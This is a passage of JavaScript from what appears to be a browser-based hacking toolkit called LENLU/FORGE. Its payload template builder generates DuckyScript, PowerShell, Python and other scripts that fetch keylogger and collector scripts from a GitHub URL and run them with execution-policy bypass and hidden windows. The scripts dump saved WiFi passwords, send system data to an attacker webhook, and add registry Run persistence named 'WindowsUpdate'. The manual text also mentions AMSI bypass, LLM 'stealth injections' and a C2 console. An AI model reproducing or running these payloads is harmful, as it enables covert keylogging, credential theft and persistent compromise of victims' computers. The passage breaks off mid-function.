      this.selectionStart = this.selectionEnd = start + 2;
      if (typeof lintSource === 'function') lintSource(this.value);
    }
  });
};

// ================================================================
// 18. RESPONSIVE NAV — Group tabs for mobile
// ================================================================
window.initResponsiveNav = function () {
  const checkWidth = () => {
    const tabs = document.querySelector('.nav-tabs');
    if (!tabs) return;
    if (window.innerWidth < 480) {
      tabs.style.maxHeight = '38px';
    } else {
      tabs.style.maxHeight = '';
    }
  };
  checkWidth();
  window.addEventListener('resize', checkWidth);
};

// ================================================================
// 19. STATISTICS TRACKING — Enhanced
// ================================================================
window.trackFeatureUsage = function (feature) {
  const stats = JSON.parse(localStorage.getItem('lenlu_usage') || '{}');
  stats[feature] = (stats[feature] || 0) + 1;
  stats['_lastUsed'] = new Date().toISOString();
  localStorage.setItem('lenlu_usage', JSON.stringify(stats));
};

// ================================================================
// SUB-TAB & VIEW-SUITE MANAGEMENT
// ================================================================
window.switchSubTab = function(suiteId, tabId, btn) {
  const suiteEl = document.getElementById('view-' + suiteId);
  if (!suiteEl) return;
  suiteEl.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  suiteEl.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
  const targetPanel = suiteEl.querySelector('#subtab-' + suiteId + '-' + tabId);
  if (targetPanel) targetPanel.classList.add('active');
  if (typeof playTone === 'function') {
    playTone(660, 'sine', .05, .03);
  }
};

window.switchViewSuite = function(suiteId, tabId) {
  const btn = document.querySelector(`[data-view="${suiteId}"]`);
  if (typeof window.switchView === 'function') {
    window.switchView(suiteId, btn);
  }
  const tabBtn = document.querySelector(`#view-${suiteId} .tab-btn[onclick*="${tabId}"]`);
  if (tabBtn) {
    tabBtn.click();
  }
};

// Override switchView to track usage
if (typeof window.switchView === 'function') {
  const originalSwitchView = window.switchView;
  window.switchView = function (view, btn) {
    window.trackFeatureUsage('view_' + view);
    originalSwitchView(view, btn);
  };
}

// ================================================================
// 20. INIT — Called when DOM is ready
// ================================================================
window.initNewFeatures = function () {
  window.initResponsiveNav();
  window.initEditorAutocomplete();

  // Initialize color picker if view exists
  const colorHex = document.getElementById('colorHex');
  if (colorHex) {
    colorHex.addEventListener('input', (e) => window.updateColorPicker(e.target.value));
    window.updateColorPicker('#00ff41');
  }

  // Live regex testing
  const regexPattern = document.getElementById('regexPattern');
  const regexTest = document.getElementById('regexTest');
  if (regexPattern) regexPattern.addEventListener('input', window.testRegex);
  if (regexTest) regexTest.addEventListener('input', window.testRegex);

  // Live JSON formatting indicator
  const jsonInput = document.getElementById('jsonInput');
  if (jsonInput) jsonInput.addEventListener('input', () => {
    try {
      JSON.parse(jsonInput.value); const s = document.getElementById('jsonStatus');
      if (s) { s.textContent = '✓ Valid JSON'; s.style.color = 'var(--g)'; }
    } catch (e) {
      const s = document.getElementById('jsonStatus');
      if (s) { s.textContent = '✗ ' + e.message; s.style.color = 'var(--amber)'; }
    }
  });

  // Timestamp — update on input
  const tsInput = document.getElementById('tsInput');
  if (tsInput) tsInput.addEventListener('input', window.convertTimestamp);

  // Cron — update on input
  const cronInput = document.getElementById('cronInput');
  if (cronInput) cronInput.addEventListener('input', window.parseCron);

  // Search — live search
  const searchInput = document.getElementById('globalSearchInput');
  if (searchInput) searchInput.addEventListener('input', () => window.globalSearch(searchInput.value));

  console.log('[FORGE v5.0] New features initialized');
  
  // Initialize dynamic manuals & buttons
  if (typeof window.initUserManualButtons === 'function') {
    window.initUserManualButtons();
  }
};

// ================================================================
// 21. CONSOLIDATED TOOLS SWAPPER
// ================================================================
const CONSOLIDATED_TOOLS = [
  'scanner', 'network', 'encoder', 'keymap', 'osint',
  'speedtest', 'clipboard', 'whois', 'diff', 'macro',
  'architect', 'subnets', 'mitre', 'crypto', 'audit',
  'c2_hive', 'dev-suite', 'sec-suite', 'sys-suite', 'terminal', 'templates'
];
window.CONSOLIDATED_TOOLS = CONSOLIDATED_TOOLS;

window.switchTool = function(toolId, btn) {
  // Switch view to 'tools' first
  const toolsBtn = document.querySelector('[data-view="tools"]');
  if (window.switchViewDirect) {
    window.switchViewDirect('tools', toolsBtn);
  } else {
    const target = document.getElementById('view-tools');
    if (target) {
      document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
      document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
      target.classList.add('active');
      if (toolsBtn) toolsBtn.classList.add('active');
    }
  }

  // Set active sidebar tab
  const sidebar = document.querySelector('.tools-sidebar');
  if (sidebar) {
    sidebar.querySelectorAll('.tool-tab-btn').forEach(b => b.classList.remove('active'));
    if (btn) {
      btn.classList.add('active');
    } else {
      const targetBtn = sidebar.querySelector(`.tool-tab-btn[onclick*="'${toolId}'"]`);
      if (targetBtn) targetBtn.classList.add('active');
    }
  }

  // Toggle viewport element
  const viewport = document.getElementById('tools-viewport');
  if (viewport) {
    // Hide current active panels in viewport
    viewport.querySelectorAll('#tools-viewport > .view, #tools-viewport > .tab-panel').forEach(p => {
      p.classList.remove('active');
      p.style.display = 'none';
    });

    let targetPanel = document.getElementById('subtab-tools-' + toolId);
    if (!targetPanel) {
      targetPanel = document.getElementById('view-' + toolId);
    }
    if (targetPanel) {
      if (targetPanel.parentNode !== viewport) {
        viewport.appendChild(targetPanel);
      }
      targetPanel.classList.add('active');
      targetPanel.style.display = 'flex';
      
      // Trigger UI updates
      if (toolId === 'scanner') {
        if (typeof window.checkBLE === 'function') window.checkBLE();
        if (typeof window.checkWebGL === 'function') window.checkWebGL();
      } else if (toolId === 'speedtest') {
        if (typeof window.drawSpeedGauge === 'function') window.drawSpeedGauge(0);
      } else if (toolId === 'keymap') {
        if (typeof window.initVirtualKeyboardClicks === 'function') window.initVirtualKeyboardClicks();
        if (typeof window.parseKeymapScript === 'function') window.parseKeymapScript();
      }
    }
  }
  if (typeof window.playTone === 'function') window.playTone(660, 'sine', .05, .03);
};

// Intercept switchView
if (typeof window.switchView === 'function') {
  window.switchViewDirect = window.switchView;
  window.switchView = function (view, btn) {
    if (typeof window.trackFeatureUsage === 'function') {
      window.trackFeatureUsage('view_' + view);
    }
    if (CONSOLIDATED_TOOLS.includes(view)) {
      window.switchTool(view);
    } else if (view === 'tools') {
      window.switchViewDirect('tools', btn);
      const activeBtn = document.querySelector('.tools-sidebar .tool-tab-btn.active') || document.querySelector('.tools-sidebar .tool-tab-btn');
      const toolId = activeBtn ? activeBtn.getAttribute('onclick').match(/'([^']+)'/)[1] : 'templates';
      window.switchTool(toolId, activeBtn);
    } else {
      window.switchViewDirect(view, btn);
    }
  };
}

// ================================================================
// 22. USER MANUALS RENDERER
// ================================================================
const MANUALS = {
  home: {
    title: "Deck Command Overview",
    desc: "Welcome to the LENLU SC Command Deck. This dashboard acts as the telemetry coordinator for compiler tasks, neural synthesis, wireless scanning, local port mappings, and offline databases. Use the top navigation tabs to toggle views, and consult the activity logs for system beacons."
  },
  compiler: {
    title: "IDE Compiler & DuckyScript Syntax",
    desc: "DuckyScript compiles actions into Keystroke Assembly. Basic commands:\n\n" +
          "• <strong>DELAY [ms]</strong>: Pauses execution (e.g. DELAY 500)\n" +
          "• <strong>STRING [text]</strong>: Types exact text characters\n" +
          "• <strong>STRINGLN [text]</strong>: Types text and presses Enter\n" +
          "• <strong>ENTER / GUI r / TAB</strong>: Triggers keyboard control keys\n" +
          "• <strong>REM [comment]</strong>: Ignores script lines for comments\n" +
          "• <strong>REPEAT [n]</strong>: Replays the preceding action line n times\n\n" +
          "Use the compile options to build AutoIt (.au3) files, export to multi-languages (PS1, PY, SH), or obfuscate variables."
  },
  neural: {
    title: "Neural AI Generator Lab",
    desc: "The Neural Synthesis panel interfaces with online Large Language Models using client-side API configurations. Choose your endpoint (Anthropic, OpenAI, Groq), fill in your key, and calibrate system prompts for either stealth injections, pranks, or OSINT recons. Dictate instructions via voice using Web Speech SpeechRecognition."
  },
  tools: {
    title: "Consolidated Hacking Tools Deck",
    desc: "All sub-tools and utilities are nested here. Use the category panel on the left to select your active workspace module. You can switch between intrusion payloads, wireless scans, network calculators, text diff outputs, and compliance checklists."
  },
  templates: {
    title: "Payload templates Builder",
    desc: "Automates script creation. Select a standard template (e.g. Sysinfo, Wifi grabber, Keylogger, Persistence), enter a customized HTTP webhook URL, choose the target programming language (DuckyScript, PowerShell, Python, Bash, AutoIt, Batch), and hit generate. Send output directly to IDE using 'Send to Editor'."
  },
  scanner: {
    title: "BLE & Acoustic Spectrum Scan",
    desc: "Web Bluetooth API active scans search for local BLE nodes. View wireless beacons, identify signal strength (RSSI), and evaluate noise rates. The audio analyser captures real-time input frequencies using the FFT analyser node and renders 2D waves."
  },
  network: {
    title: "GeoIP Lookup & Port Sweep",
    desc: "Resolves local ISP metrics, IP coordinates, and jitter drops. Use the Sockets Sweep utility to test if local ports (80, 443, 3000, 8080, etc.) are currently listening on localhost to map developer servers."
  },
  encoder: {
    title: "Multi-Format Stream Encoder",
    desc: "Encodes and decodes payloads into multiple standard representations. Formats: Base64, Hexadecimal, URL Percent, Rot13 cipher, Morse code, Binary streams, and SHA checksum hashes."
  },
  keymap: {
    title: "Keymap Replayer Visualizer",
    desc: "Renders virtual keyboard mappings. Load a script from the compiler to parse actions, then hit replay or step to watch real-time simulated keystrokes animate on the physical QWERTY matrix layout."
  },
  osint: {
    title: "OSINT Browser Proximity Fingerprint",
    desc: "Traces browser fingerprint configurations. Resolves canvas rendering hashes, WebGL graphics cards profiles, screen metrics, connection status, and User Agent identifiers to analyze target environments."
  },
  vault: {
    title: "Encrypted Script Vault",
    desc: "Stores payloads locally using Web IndexedDB. Backups are encrypted at rest. You can search files, load scripts directly back to the editor workspace, or export database arrays to JSON packets."
  },
  history: {
    title: "Compilation Build Logs",
    desc: "Maintains a chronological session timeline of compilations, line lengths, timestamps, and target output sizes. Clear logs or copy entries from history."
  },
  settings: {
    title: "Command Config",
    desc: "Personalizes the deck visual interface. Toggles CRT rasterizer lines, matrix green rain opacity, audio feedback synthesizers, background WebGL particle counts, and film grain effect."
  },
  terminal: {
    title: "Interactive Forge Shell",
    desc: "Runs diagnostic instructions inside the deck. Commands:\n" +
          "• <strong>help</strong>: Lists active commands\n" +
          "• <strong>status</strong>: Reports session statistics\n" +
          "• <strong>compile</strong>: Runs the compiler compiler pipeline\n" +
          "• <strong>osint / network</strong>: Resolves scanners\n" +
          "• <strong>vault / history</strong>: Queries databases\n" +
          "• <strong>clear</strong>: Wipes shell output log"
  },
  speedtest: {
    title: "Bandwidth Speed Test",
    desc: "Measures current network metrics. Fetches files to calculate download speed, performs Cloudflare DNS queries to evaluate round-trip latencies, and measures jitter drops."
  },
  whois: {
    title: "WHOIS Domain Query",
    desc: "Queries internet domain registrars to retrieve ownership, DNS nameservers, registration dates, and admin contact cards."
  },
  diff: {
    title: "Text Diff Comparer",
    desc: "Calculates character and line differences between two code blocks. Highlights additions in green and deletions in red."
  },
  macro: {
    title: "Macro Automation Recorder",
    desc: "Records manual inputs and typing to translate actions directly into DELAY and STRING DuckyScript compiler sequences."
  },
  architect: {
    title: "Topology Layout Architect",
    desc: "Drag-and-drop interactive canvas to model local subnets, router nodes, endpoints, and simulate packet transmission beacons."
  },
  subnets: {
    title: "Subnet CIDR Calculator",
    desc: "Processes IP addresses and CIDR prefix masks to compute network addresses, broadcast ranges, netmasks, and total addressable host lists."
  },
  mitre: {
    title: "MITRE ATT&CK Matrix Reference",
    desc: "Ethical cybersecurity guide documenting real-world threat tactics (Initial Access, Execution, Persistence, Defense Evasion), technical descriptions, and mitigation strategies."
  },
  crypto: {
    title: "Cryptographic Benchmark Suite",
    desc: "Resolves SHA algorithms speeds (SHA-1, SHA-256, SHA-512) by computing multiple hashes per second to benchmark processor performance."
  },
  audit: {
    title: "Privacy & Compliance Audit",
    desc: "Reviews browser headers, cookies, track flags, WebRTC leak points, and canvas permissions to compute a security rating score."
  },
  c2_hive: {
    title: "C2 Hive Command Console",
    desc: "Mocks a command-and-control beacon listener panel. Tracks simulated agent beacons, lists active sessions, and transmits script blocks."
  }
};

window.openUserManual = function(viewId) {
  const manual = MANUALS[viewId] || { title: "User Manual", desc: "Consult standard deck operations guidelines for details." };
  const titleEl = document.getElementById('manualTitle');
  const contentEl = document.getElementById('manualContent');
  if (titleEl && contentEl) {
    titleEl.textContent = manual.title;
    contentEl.innerHTML = manual.desc.replace(/\n/g, '<br>');
    if (typeof openModal === 'function') {
      openModal('modal-manual');
    } else {
      document.getElementById('modal-manual')?.classList.add('open');
    }
  }
};

window.initUserManualButtons = function() {
  const views = [
    { id: 'home', title: 'Home Overview' },
    { id: 'compiler', title: 'IDE Compiler' },
    { id: 'neural', title: 'Neural AI Lab' },
    { id: 'vault', title: 'Secure Vault' },
    { id: 'history', title: 'Build History' },
    { id: 'settings', title: 'Configuration Settings' },
    // tools
    { id: 'scanner', title: 'Wireless & Audio Scanner' },
    { id: 'network', title: 'GeoIP & Ports Sweep' },
    { id: 'encoder', title: 'Obfuscator & Encoder' },
    { id: 'keymap', title: 'Keymap Replayer' },
    { id: 'osint', title: 'OSINT Canvas' },
    { id: 'speedtest', title: 'Speed & Latency Test' },
    { id: 'clipboard', title: 'Clipboard Dropper' },
    { id: 'whois', title: 'WHOIS Lookup' },
    { id: 'diff', title: 'Diff Compare' },
    { id: 'macro', title: 'Macro Recorder' },
    { id: 'architect', title: 'Topology Builder' },
    { id: 'subnets', title: 'Subnet CIDR' },
    { id: 'mitre', title: 'MITRE ATT&CK Mapping' },
    { id: 'crypto', title: 'Crypto Toolkit' },
    { id: 'audit', title: 'Privacy & Compliance Audit' },
    { id: 'dev-suite', title: 'Developer Suite' },
    { id: 'sec-suite', title: 'Security Suite' },
    { id: 'sys-suite', title: 'System Suite' },
    { id: 'terminal', title: 'Interactive Shell' }
  ];

  views.forEach(v => {
    const el = document.getElementById('view-' + v.id);
    if (!el) return;

    let header = el.querySelector('.hero-banner') || el.querySelector('.view-header');
    if (!header) {
      header = document.createElement('div');
      header.className = 'view-header';
      header.style.display = 'flex';
      header.style.justifyContent = 'space-between';
      header.style.alignItems = 'center';
      header.style.marginBottom = '1rem';
      header.style.borderBottom = '1px solid var(--gbord)';
      header.style.paddingBottom = '0.5rem';
      
      const title = document.createElement('h2');
      title.style.fontFamily = 'var(--font-display)';
      title.style.fontSize = '1.1rem';
      title.style.color = 'var(--white)';
      title.style.textTransform = 'uppercase';
      title.style.margin = '0';
      title.textContent = v.title;
      header.appendChild(title);
      
      el.insertBefore(header, el.firstChild);
    }

    if (!header.querySelector('.manual-btn')) {
      const btn = document.createElement('button');
      btn.className = 'manual-btn';
      btn.title = 'Open Manual';
      btn.innerHTML = '<i class="fas fa-info-circle"></i>';
      btn.style.marginLeft = 'auto';
      btn.onclick = (e) => {
        e.stopPropagation();
        window.openUserManual(v.id);
      };
      
      if (header.classList.contains('hero-banner')) {
        let rightDiv = header.querySelector('.ch-right');
        if (!rightDiv) {
          rightDiv = document.createElement('div');
          rightDiv.className = 'ch-right';
          header.appendChild(rightDiv);
        }
        rightDiv.appendChild(btn);
      } else {
        header.appendChild(btn);
      }
    }
  });
};

// ================================================================
// 23. PAYLOAD TEMPLATES BUILDER (Feature 1)
// ================================================================
let tpSelected = 'sysinfo';
window.tpSelectTemplate = function(id, btn) {
  tpSelected = id;
  document.querySelectorAll('#tpChoices .sc-choice').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');

  const desc = document.getElementById('tpDesc');
  if (!desc) return;
  const descs = {
    sysinfo: 'Collects hardware, OS, and user information and sends it to a webhook.',
    processes: 'Collects running processes, services, and installed programs and sends them to your webhook.',
    network: 'Collects WiFi passwords, IP configuration, DNS, and ARP tables and sends them to your webhook.',
    keylogger_full: 'Runs a persistent background keylogger that captures and reports all keystrokes.',
    persistence: 'Ensures the keylogger is installed and adds it to the Windows Registry for boot persistence.',
    suite: 'The full arsenal: downloads and runs all collectors, installs the keylogger, and sets up persistence.',
    remove: 'Stops all active keylogger jobs, removes registry persistence, and deletes all temporary script files.'
  };
  desc.textContent = descs[id] || '';
};

window.tpGenerate = function() {
  const webhook = document.getElementById('tpWebhookUrl').value.trim();
  if (!webhook) { toast('Enter a Webhook URL', 'warn'); return; }

  const lang = document.getElementById('tpTargetLang').value;
  const injectAmsi = document.getElementById('tog-tpAmsi')?.classList.contains('on');
  const stealth = document.getElementById('tog-tpStealth')?.classList.contains('on');

  let script = '';
  
  if (lang === 'duckyscript') {
    // DuckyScript syntax
    if (tpSelected === 'sysinfo') {
      script = `REM System Info Collector - Hardware, OS, Users\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING curl -o "$env:TEMP\\sysinfo.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/sysinfo.ps1"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\sysinfo.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 3000\nSTRING Write-Host "System Info Collected!" -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
    } else if (tpSelected === 'processes') {
      script = `REM Processes & Files Collector - Running processes, services, installed programs\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING curl -o "$env:TEMP\\process.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/process.ps1"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\process.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 3000\nSTRING Write-Host "Process Info Collected!" -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
    } else if (tpSelected === 'network') {
      script = `REM Network & WiFi Info Collector - WiFi passwords, IP, DNS, ARP\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING curl -o "$env:TEMP\\network.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/network.ps1"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\network.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 3000\nSTRING Write-Host "Network Info Collected!" -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
    } else if (tpSelected === 'keylogger_full') {
      script = `REM Keylogger Only - Runs forever, captures keystrokes\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING curl -o "$env:TEMP\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:TEMP\\keylogger.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING Write-Host "Keylogger Running!" -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
    } else if (tpSelected === 'persistence') {
      script = `REM Add Persistence - Makes keylogger start on boot\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING if (!(Test-Path "$env:TEMP\\keylogger.ps1")) { curl -o "$env:TEMP\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1" }\nDELAY 1000\nENTER\nDELAY 2000\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \`"$env:TEMP\\keylogger.ps1\`" -webhookUrl ${webhook}" /f\nDELAY 1000\nENTER\nDELAY 2000\nSTRING Write-Host "Persistence Added! Keylogger will start on boot." -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
    } else if (tpSelected === 'suite') {
      script = `REM Complete Suite - Runs all collectors + keylogger + persistence\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING mkdir $env:TEMP\\logger -Force\nDELAY 1000\nENTER\nDELAY 500\nSTRING curl -o "$env:TEMP\\logger\\sysinfo.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/sysinfo.ps1"\nDELAY 1000\nENTER\nDELAY 500\nSTRING curl -o "$env:TEMP\\logger\\network.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/network.ps1"\nDELAY 1000\nENTER\nDELAY 500\nSTRING curl -o "$env:TEMP\\logger\\process.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/process.ps1"\nDELAY 1000\nENTER\nDELAY 500\nSTRING curl -o "$env:TEMP\\logger\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1"\nDELAY 1000\nENTER\nDELAY 500\nSTRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\sysinfo.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\network.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\process.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \`"$env:TEMP\\logger\\keylogger.ps1\`" -webhookUrl ${webhook}" /f\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\keylogger.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING Write-Host "Complete Suite Deployed!" -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
    } else if (tpSelected === 'remove') {
      script = `REM Remove Everything - Stop keylogger and delete files\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING Get-Job | Stop-Job -Force; Get-Job | Remove-Job -Force\nDELAY 1000\nENTER\nDELAY 1000\nSTRING reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /f\nDELAY 1000\nENTER\nDELAY 1000\nSTRING Get-Process powershell | Where-Object { $_.StartTime -gt (Get-Date).AddHours(-1) } | Stop-Process -Force\nDELAY 1000\nENTER\nDELAY 1000\nSTRING Remove-Item "$env:TEMP\\logger" -Recurse -Force -ErrorAction SilentlyContinue\nDELAY 1000\nENTER\nDELAY 500\nSTRING Remove-Item "$env:TEMP\\*.ps1" -Force -ErrorAction SilentlyContinue\nDELAY 1000\nENTER\nDELAY 500\nSTRING Write-Host "All components removed!" -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
    }
  } else if (lang === 'powershell') {
    // Generate native PowerShell
    const bypassStr = injectAmsi ? `# AMSI bypass option enabled (Educational)\n` : '';
    if (tpSelected === 'sysinfo') {
      script = `${bypassStr}$webhook = "${webhook}"\n$sys = @{\n  OS = (Get-CimInstance Win32_OperatingSystem).Caption\n  Host = $env:COMPUTERNAME\n  User = $env:USERNAME\n  RAM = "$([Math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum / 1GB)) GB"\n}\nInvoke-RestMethod -Uri $webhook -Method Post -Body (ConvertTo-Json $sys) -ContentType "application/json"`;
    } else if (tpSelected === 'processes') {
      script = `${bypassStr}$webhook = "${webhook}"\n$procs = Get-Process | Select-Object ProcessName, Id, CPU | ConvertTo-Json\nInvoke-RestMethod -Uri $webhook -Method Post -Body $procs -ContentType "application/json"`;
    } else if (tpSelected === 'network') {
      script = `${bypassStr}$webhook = "${webhook}"\n$wlan = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.Line.Split(":")[1].Trim() } | ForEach-Object { [PSCustomObject]@{ SSID = $_; Key = (netsh wlan show profile name=$_ key=clear | Select-String "Key Content" | ForEach-Object { $_.Line.Split(":")[1].Trim() }) } } | ConvertTo-Json\nInvoke-RestMethod -Uri $webhook -Method Post -Body $wlan -ContentType "application/json"`;
    } else {
      script = `# PowerShell Script - Ethically configured for authorized use only\n$webhook = "${webhook}"\nWrite-Host "Triggered ${tpSelected} payload"`;
    }
  } else if (lang === 'python') {
    // Generate native Python
    if (tpSelected === 'sysinfo') {
      script = `import platform, os, json, urllib.request\nwebhook = "${webhook}"\ninfo = {\n  "OS": platform.system() + " " + platform.release(),\n  "User": os.environ.get("USERNAME", "unknown"),\n  "Host": platform.node()\n}\nreq = urllib.request.Request(webhook, data=json.dumps(info).encode(), headers={'Content-Type': 'application/json'})\nurllib.request.urlopen(req)`;
    } else {
      script = `import json, urllib.request\nwebhook = "${webhook}"\nprint("Running ${tpSelected} collector payload")`;
    }
  } else if (lang === 'bash') {
    // Generate native Bash
    script = `#!/bin/bash\nWEBHOOK="${webhook}"\ncase "${tpSelected}" in\n  "sysinfo")\n    DATA="{\\"os\\":\\"\$(uname -a)\\",\\"user\\":\\"\$(whoami)\\"}"\n    ;;\n  *)\n    DATA="{\\"action\\":\\"${tpSelected}\\"}"\n    ;;\nesac\ncurl -X POST -H "Content-Type: application/json" -d "$DATA" "$WEBHOOK"`;
  } else if (lang === 'autoit') {
    // Generate native AutoIt
    script = `; AutoIt3 Script\nLocal $sWebhook = "${webhook}"\nLocal $sData = '{"action":"${tpSelected}","user":"' & @UserName & '"}'\nLocal $oHTTP = ObjCreate("WinHttp.WinHttpRequest.5.1")\n$oHTTP.Open("POST", $sWebhook, False)\n$oHTTP.SetRequestHeader("Content-Type", "application/json")\n$oHTTP.Send($sData)`;
  } else if (lang === 'batch') {
    // Generate native Batch
    script = `@echo off\nset "WEBHOOK=${webhook}"\nset "DATA={\\"action\\":\\"${tpSelected}\\",\\"user\\":\\"%USERNAME%\\"}"\ncurl -X POST -H "Content-Type: application/json" -d "%DATA%" "%WEBHOOK%"`;
  }

  document.getElementById('tpOutput').value = script;
  document.getElementById('tpOutputCard').style.display = 'flex';
  toast('Template generated ✓');
};

window.tpToEditor = function() {
  const script = document.getElementById('tpOutput').value.trim();
  if (!script) return;
  const editor = document.getElementById('srcEditor');
  if (editor) {
    editor.value = script;
    if (typeof lintSource === 'function') lintSource(script);
    if (typeof updateEditorCounts === 'function') updateEditorCounts();
    if (typeof switchView === 'function') switchView('compiler', document.querySelector('[data-view=compiler]'));
    toast('Template sent to compiler editor');
  }
};

window.tpClear = function() {
  document.getElementById('tpOutput').value = '';
  document.getElementById('tpOutputCard').style.display = 'none';
};

// ================================================================
// 24. FLOATING AGENTIC AI CHATBOT (Feature 2)
// ================================================================
let chatbotBackend = localStorage.getItem('lenlu_chatbot_backend') || 'groq';
window.chatbotBackend = chatbotBackend;

// Initialize dropdown value on load
setTimeout(() => {
  const select = document.getElementById('botBackend');
  if (select) select.value = chatbotBackend;
}, 100);


window.toggleFloatingChatbot = function() {
  const win = document.getElementById('floating-chatbot-window');
  const indicator = document.getElementById('chatbot-indicator');
  if (win) {
    const isOpen = win.classList.contains('open');
    if (isOpen) {
      win.classList.remove('open');
    } else {
      win.classList.add('open');
      if (indicator) indicator.style.display = 'none';
      document.getElementById('botInput')?.focus();
    }
  }
  if (typeof playTone === 'function') playTone(880, 'sine', 0.05, 0.04);
};

window.changeBotBackend = function() {
  chatbotBackend = document.getElementById('botBackend').value;
  localStorage.setItem('lenlu_chatbot_backend', chatbotBackend);
  if (typeof toast === 'function') toast('AI Backend: ' + chatbotBackend.toUpperCase(), 'info');
};

window.clearBotChat = function() {
  const messages = document.getElementById('botMessages');
  if (messages) {
    messages.innerHTML = `<div class="msg ai" style="display: flex; flex-direction: column; gap: 0.2rem; max-width: 85%;">
      <div class="msg-bubble" style="padding: 0.6rem 0.8rem; border-radius: 8px; border-bottom-left-radius: 2px;">
        Greetings, I am the Forge AI Copilot. How may I assist you with your scripts, automation tools, or cyber audits today?
        <div style="font-size:0.6rem; color:var(--muted); margin-top:0.4rem;">💡 You can ask me to "write a script to...", "switch to settings", "run speed test", "export script", or "clear editor".</div>
      </div>
      <div style="font-size: 0.54rem; color: var(--muted); padding-left: 0.2rem;">COPILOT · SYSTEM</div>
    </div>`;
  }
  toast('Chat history wiped', 'info');
};

window.sendBotChat = async function() {
  const inp = document.getElementById('botInput');
  const query = inp?.value?.trim();
  if (!query) return;
  inp.value = '';

  appendBotMsg(query, 'user');
  
  const thinkingId = appendBotMsg('Connecting to neural gate...', 'ai', true);
  
  let key = '';
  let url = '';
  let body = {};
  
  const userConfig = JSON.parse(localStorage.getItem('lenlu_ai4') || '{}');
  
  if (chatbotBackend === 'groq') {
    key = userConfig.keys?.groq || ''; // Enter your Groq API key in AI Settings
    url = 'https://api.groq.com/openai/v1/chat/completions';
    body = {
      model: 'llama-3.3-70b-versatile',
      messages: [
